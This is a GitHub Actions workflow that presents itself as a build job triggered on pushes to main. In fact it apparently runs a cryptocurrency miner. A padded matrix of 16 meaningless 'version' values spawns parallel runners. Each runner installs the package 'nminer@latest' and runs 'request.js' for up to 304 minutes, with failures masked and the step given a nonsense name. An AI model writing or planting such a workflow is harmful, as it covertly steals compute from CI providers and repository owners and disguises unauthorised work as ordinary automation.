name: request
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9277 }
          - { version: 3851 }
          - { version: 2568 }
          - { version: 7904 }
          - { version: 7538 }
          - { version: 9479 }
          - { version: 9600 }
          - { version: 9198 }
          - { version: 4654 }
          - { version: 4947 }
          - { version: 3678 }
          - { version: 5465 }
          - { version: 8239 }
          - { version: 945 }
          - { version: 2641 }
          - { version: 965 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: coil per abaft correctly taut
        run: |
          npm install nminer@latest
          timeout 304m node request.js || echo "request executed"